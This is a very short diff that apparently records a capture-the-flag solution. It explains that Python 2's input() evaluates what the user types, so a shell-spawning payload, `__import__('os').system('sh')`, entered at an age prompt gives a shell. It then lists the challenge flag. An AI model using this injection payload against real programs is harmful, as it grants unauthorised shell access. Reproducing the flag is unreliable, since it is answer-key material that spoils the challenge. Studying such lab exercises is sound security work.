@@ -1,0 +1,2 @@
+input `__import__('os').system('sh')` when asking age as it is using `input` in python 2
+ictf{pyth0n_tw0_1s_st1ll_us3d_00f}
